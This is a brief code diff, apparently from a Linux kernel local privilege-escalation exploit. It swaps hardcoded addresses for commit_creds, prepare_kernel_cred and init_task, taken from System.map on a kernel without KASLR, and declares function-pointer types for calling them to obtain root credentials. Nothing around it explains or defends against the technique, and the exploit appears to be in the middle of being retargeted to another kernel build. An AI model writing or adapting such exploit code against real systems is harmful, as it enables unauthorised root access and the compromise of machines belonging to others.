@@ -35,9 +35,9 @@
 /* ============================== Kernel stuff ============================== */
 
 /* Addresses from System.map (no KASLR) */
-#define COMMIT_CREDS_PTR		0xffffffff81123b20UL
-#define PREPARE_KERNEL_CRED_PTR		0xffffffff81124080UL
-#define INIT_TASK_PTR			0xffffffff83411080UL
+#define COMMIT_CREDS_PTR		0xffffffff810c0960UL
+#define PREPARE_KERNEL_CRED_PTR		0xffffffff810c0bf0UL
+#define INIT_TASK_PTR			0xffffffff82a0c940UL
 
 typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
